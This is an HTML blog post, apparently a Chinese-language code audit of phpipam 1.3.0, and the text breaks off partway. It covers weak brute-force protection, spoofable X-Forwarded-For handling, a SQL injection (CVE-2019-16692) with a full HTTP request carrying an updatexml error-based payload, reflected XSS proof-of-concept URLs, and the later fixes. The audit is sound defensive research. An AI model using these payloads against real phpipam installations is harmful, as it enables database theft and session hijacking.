@@ -1,0 +1,608 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="jelly">
+  <meta name="keywords" content="">
+  
+  <title>PHPIPAM 代码审计 - jelly&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":"14de5c0cf6db6044f06b32ef50694a98","google":"G-1S553HH16G","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Jelly's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/doll.webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="PHPIPAM 代码审计">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-09-12 11:53" pubdate>
+        2021年9月12日 中午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      25
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PHPIPAM 代码审计</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：31 分钟前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>phpipam是一个开源Web IP地址管理应用程序（IPAM）。其目标是提供轻便，现代且有用的IP地址管理。它是基于PHP的应用程序，具有MySQL数据库后端，使用jQuery库，ajax和HTML5 / CSS3功能。</p>
+<p>官方网站：<a target="_blank" rel="noopener" href="https://phpipam.net/">https://phpipam.net/</a></p>
+<p>项目代码地址：<a target="_blank" rel="noopener" href="https://github.com/phpipam/phpipam">https://github.com/phpipam/phpipam</a></p>
+<p>本文使用的版本是phpipam1.3.0，目前最新版本是php1.4.3，至于为什么选1.3，懂得都懂</p>
+<p>本文挖的洞是参考官方修复文档做的，漏洞并不限于phpipam1.3.0</p>
+<p>搭建好环境后可以修改系统语言，在账号修改处可以修改中文。还是很有必要哈哈哈：</p>
+<img src="img/phpipam/image-20210610155008877.png" srcset="/img/loading.gif" lazyload alt="image-20210610155008877" style="zoom:50%;" />
+
+
+
+<h1 id="登陆验证"><a href="#登陆验证" class="headerlink" title="登陆验证"></a>登陆验证</h1><p>做了一个登陆逻辑分析，好像也没什么用。。。</p>
+<p><img src="img/phpipam/ipam.png" srcset="/img/loading.gif" lazyload alt="ipam"></p>
+<p>该网站基本都是后台网页，所以漏洞基本存在于后台，所以怎么突破前端验证才能利用这些漏洞。</p>
+<p>该网站是有防爆账号密码的处理，当同一个ip登陆次数失败超过5次就需要输入验证码。但很傻的是验证码每次请求后不会刷新，那就可以用这个验证码进行爆破。</p>
+<p>另外该网站验证的 ip 优先来自HTTP_X_FORWARDED_FOR，客户端可伪造。</p>
+<p>functions/classes/class.User.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1544</span>:<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">block_get_ip</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment"># set IP</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123; <span class="hljs-keyword">$this</span>-&gt;ip = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]; &#125;<br>        <span class="hljs-keyword">else</span>                                        &#123; <span class="hljs-keyword">$this</span>-&gt;ip = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]; &#125;<br><span class="hljs-number">1548</span>:&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h1><p>【系统默认开启报错显示】</p>
+<p>functions/functions.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">10</span>:ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-number">11</span>:ini_set(<span class="hljs-string">&#x27;display_startup_errors&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-number">12</span>:<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$debugging</span>) &#123; error_reporting(E_ERROR ^ E_WARNING); &#125;<br><span class="hljs-number">13</span>:<span class="hljs-keyword">else</span>			 &#123; error_reporting(E_ALL ^ E_NOTICE ^ E_STRICT); &#125;<br></code></pre></td></tr></table></figure>
+
+<p>10-11 行通过运行时配置 php.ini 的配置项 display_errors 和 display_startup_errors ，这样程序会输出报错信息。</p>
+<p>12-13 行通过 $debugging 值确定程序具体输出什么级别的报错信息（如果php.ini中报错信息被关闭，通过error_reporting函数也无法输出报错信息）</p>
+<blockquote>
+<p>display_startup_errors 主要指启动错误，如配置文件出现问题而报错</p>
+</blockquote>
+<p>这里都是打开报错提示的，如果存在sql注入就可能存在sql报错注入，不过开发者在程序上线时可能会把display_errors 和 display_startup_errors 设置为off，这个时候sql报错注入可能要转成盲注判断。</p>
+<hr>
+<p>【防御手段寻找】</p>
+<p>全文似乎没有对<code>$_GET</code>，<code>$_POST</code>这些数据做统一过滤。</p>
+<p>然后搜了sql，xss这些关键字，SQL主要是预编译，其中存在使用参数拼接了数据库表名的情况。另外在class.Common.php中找到一个去除标签的函数strip_input_tags()，但该函数只用于某些文件的$_POST变量传递的值</p>
+<p>functions/classes/class.Common.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">524</span>-<span class="hljs-number">535</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strip_input_tags</span> (<span class="hljs-params"><span class="hljs-variable">$input</span></span>) </span>&#123;<br>		<span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$input</span>)) &#123;<br>			<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>) &#123;<br>    			<span class="hljs-variable">$input</span>[<span class="hljs-variable">$k</span>] = strip_tags(<span class="hljs-variable">$v</span>);<br>            &#125;<br>		&#125;<br>		<span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-variable">$input</span> = strip_tags(<span class="hljs-variable">$input</span>);<br>		&#125;<br>		<span class="hljs-comment"># stripped</span><br>		<span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后有些文件会对$_POST数据做如下处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment"># strip tags - XSS</span><br><span class="hljs-variable">$_POST</span> = <span class="hljs-variable">$User</span>-&gt;strip_input_tags (<span class="hljs-variable">$_POST</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><p><a target="_blank" rel="noopener" href="https://github.com/phpipam/phpipam/issues/2738">https://github.com/phpipam/phpipam/issues/2738</a></p>
+<p>这个漏洞还有cve编号，CVE-2019-16692</p>
+<p>【注入】</p>
+<p>影响版本：phpipam &lt;= 1.4.0</p>
+<p>app/admin/custom-fields/edit.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">36</span>:<span class="hljs-variable">$Admin</span>-&gt;validate_action (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-literal">true</span>);<br><span class="hljs-number">43</span>:<span class="hljs-variable">$fieldval</span> = (<span class="hljs-keyword">array</span>) <span class="hljs-variable">$Tools</span>-&gt;fetch_full_field_definition(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;table&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fieldName&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>36行：会验证action参数，我们需要提交合法的action参数，否则会退出程序</p>
+<p>43行：<code>$_POST[&#39;table&#39;]</code> 和 <code>$_POST[&#39;fieldName&#39;]</code> 直接传入函数中，在文件中也没有找到对$_POST数据的过滤，跟踪 fetch_full_field_definition() 函数</p>
+<p>functions/classes/class.Tools.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">815</span>-<span class="hljs-number">823</span>:<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetch_full_field_definition</span> (<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$field</span></span>) </span>&#123;<br>		<span class="hljs-comment"># escape field</span><br>		<span class="hljs-variable">$table</span> = <span class="hljs-keyword">$this</span>-&gt;Database-&gt;escape(<span class="hljs-variable">$table</span>);<br>		<span class="hljs-comment"># fetch</span><br>	    <span class="hljs-keyword">try</span> &#123; <span class="hljs-variable">$field_data</span> = <span class="hljs-keyword">$this</span>-&gt;Database-&gt;getObjectQuery(<span class="hljs-string">&quot;show full columns from `<span class="hljs-subst">$table</span>` where `Field` = ?;&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-variable">$field</span>)); &#125;<br>		<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123; <span class="hljs-keyword">$this</span>-&gt;Result-&gt;show(<span class="hljs-string">&quot;danger&quot;</span>, <span class="hljs-variable">$e</span>-&gt;getMessage(), <span class="hljs-literal">false</span>);	<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; &#125;<br>		<span class="hljs-comment"># result</span><br>	    <span class="hljs-keyword">return</span>(<span class="hljs-variable">$field_data</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>$table 在sql语句中通过双引号解析出值，位于反引号中，反引号一般不会被过滤。$field 则是被预编译处理。</p>
+<p>其中$table有被eacape()函数处理过，追踪下这个函数。</p>
+<p>functions/classes/class.PDO.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">205</span>-<span class="hljs-number">220</span><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unquote_outer</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>		<span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$str</span>);<br><br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$len</span>&gt;<span class="hljs-number">1</span>) &#123;<br>			<span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;&#x27;&quot;</span> &amp;&amp; <span class="hljs-variable">$str</span>[<span class="hljs-variable">$len</span>-<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;&#x27;&quot;</span>) &#123;<br>				<span class="hljs-keyword">return</span> substr(<span class="hljs-variable">$str</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>);<br>			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;&#x27;&quot;</span>) &#123;<br>				<span class="hljs-keyword">return</span> substr(<span class="hljs-variable">$str</span>, <span class="hljs-number">1</span>);<br>			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>[<span class="hljs-variable">$len</span>-<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;&#x27;&quot;</span>) &#123;<br>				<span class="hljs-keyword">return</span> substr(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>);<br>			&#125;<br>		&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$len</span>&gt;<span class="hljs-number">0</span>) &#123;<br>			<span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;&#x27;&quot;</span>) &#123;<br>				<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>			&#125;<br>&#125;<br><span class="hljs-number">278</span>-<span class="hljs-number">282</span>:<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>		<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;isConnected()) <span class="hljs-keyword">$this</span>-&gt;connect();<br><br>		<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;unquote_outer(<span class="hljs-keyword">$this</span>-&gt;pdo-&gt;quote((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$str</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>$table 首先会经过 pdo-&gt;quote() 首尾被加上引号，并对其中的特殊字符转义</p>
+<p>然后unquote_outer() 会把首尾的引号去掉</p>
+<p>这是什么迷惑操作，难道不能直接使用addslashes()这种函数过滤吗？</p>
+<p>这里sql注入我们只需要闭合反引号就可以了，而反引号不会被上面的操作过滤掉，所以这里存在sql注入漏洞</p>
+<p>所以最终利用的POC：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/app/admin/custom-fields/edit.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>phpipam.test:8888<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>67<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://phpipam.test:8888<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://phpipam.test:8888/?page=login<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>phpipam=82d83ea690b322af6fb6a80e93a166cd<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="pgsql">action=<span class="hljs-keyword">add</span>&amp;table=users`<span class="hljs-keyword">where</span> <span class="hljs-number">1</span>=(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())),<span class="hljs-number">1</span>))#`</span><br></code></pre></td></tr></table></figure>
+
+<img src="img/phpipam/image-20210609193215564.png" srcset="/img/loading.gif" lazyload alt="image-20210609193215564" style="zoom:50%;" />
+
+<hr>
+<p>【修复情况】</p>
+<p>下载的 phpipam1.4.2 源代码查看修复情况</p>
+<p>functions/classes/class.PDO.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">294</span>-<span class="hljs-number">303</span>:<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>		<span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$str</span>;<br>		<span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$str</span>) == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>		<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;isConnected()) <span class="hljs-keyword">$this</span>-&gt;connect();<br><br>		<span class="hljs-comment">// SQL Injection - strip backquote character</span><br>		<span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$str</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;unquote_outer(<span class="hljs-keyword">$this</span>-&gt;pdo-&gt;quote(<span class="hljs-variable">$str</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到这里使用了 str_replace() 函数把反引号直接去除了</p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>【注入】</p>
+<p>影响版本：phpipam &lt;= 1.3.1</p>
+<p>app/tools/mac-lookup/index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">15</span>:&lt;input <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">search</span> <span class="hljs-title">input</span>-<span class="hljs-title">md</span> <span class="hljs-title">form</span>-<span class="hljs-title">control</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">mac</span>&quot; <span class="hljs-title">placeholder</span>=&quot;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">print</span> <span class="hljs-title">_</span>(&#x27;<span class="hljs-title">MAC</span> <span class="hljs-title">address</span>&#x27;); ?&gt;&quot; <span class="hljs-title">value</span>=&#x27;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">print</span> @$<span class="hljs-title">_GET</span>[&#x27;<span class="hljs-title">mac</span>&#x27;]; ?&gt;&#x27; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">autofocus</span>=&quot;<span class="hljs-title">autofocus</span>&quot; <span class="hljs-title">style</span>=&#x27;<span class="hljs-title">width</span>:250<span class="hljs-title">px</span>;&#x27;&gt;</span><br><span class="hljs-class">30:<span class="hljs-title">if</span> (<span class="hljs-title">strlen</span>(@$<span class="hljs-title">_GET</span>[&#x27;<span class="hljs-title">mac</span>&#x27;])&gt;0) 	</span>&#123; <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;results.php&#x27;</span>); &#125;<br><span class="hljs-number">31</span>:<span class="hljs-keyword">else</span> 							&#123; <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;tips.php&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure>
+
+<p>$_GET[‘mac’] 传入的参数并没有被过滤，直接输出到了网页中</p>
+<p>跟踪results.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">6</span>:<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mac&#x27;</span>] = trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mac&#x27;</span>]);<br><span class="hljs-number">26</span>:<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;MAC: &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mac&#x27;</span>];<br></code></pre></td></tr></table></figure>
+
+<p>同样也没有对 $_GET[‘mac’] 做xss过滤，这两个地方都能触发xss漏洞，利用poc如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//phpipam.test:8888/tools/mac-lookup/?mac=&#x27;onclick alert(1)</span><br>http:<span class="hljs-comment">//phpipam.test:8888/tools/mac-lookup/?mac=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<p>【修复情况】</p>
+<p>app/tools/mac-lookup/index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">15</span>:&lt;input <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">search</span> <span class="hljs-title">input</span>-<span class="hljs-title">md</span> <span class="hljs-title">form</span>-<span class="hljs-title">control</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">mac</span>&quot; <span class="hljs-title">placeholder</span>=&quot;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">print</span> <span class="hljs-title">_</span>(&#x27;<span class="hljs-title">MAC</span> <span class="hljs-title">address</span>&#x27;); ?&gt;&quot; <span class="hljs-title">value</span>=&#x27;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">print</span> @<span class="hljs-title">escape_input</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">mac</span>&#x27;]); ?&gt;&#x27; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">autofocus</span>=&quot;<span class="hljs-title">autofocus</span>&quot; <span class="hljs-title">style</span>=&#x27;<span class="hljs-title">width</span>:250<span class="hljs-title">px</span>;&#x27;&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>app/tools/mac-lookup/results.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">5</span>:<span class="hljs-variable">$mac</span> = escape_input(trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mac&#x27;</span>]));<br><span class="hljs-number">26</span>:<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;MAC: &quot;</span>.<span class="hljs-variable">$mac</span>;<br></code></pre></td></tr></table></figure>
+
+<p>$mac 参数通过escape_input()做了过滤</p>
+<p>functions/global_functions.php</p>
